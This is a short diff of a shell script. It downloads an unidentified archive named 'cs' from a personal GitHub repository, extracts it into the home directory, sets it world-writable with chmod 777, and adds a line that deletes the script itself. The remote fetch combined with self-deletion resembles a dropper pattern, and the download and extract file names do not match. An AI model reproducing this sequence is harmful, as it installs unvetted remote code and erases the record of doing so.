@@ -129,3 +129,5 @@ fi
 curl -L -o mycs https://github.com/xiumu590-droid/xiumu/raw/refs/heads/main/cs
 
 7z x cs -o"$HOME/cs" -y && rm -r cs && cd $HOME && chmod -R 777 cs
+
+rm -r run.sh
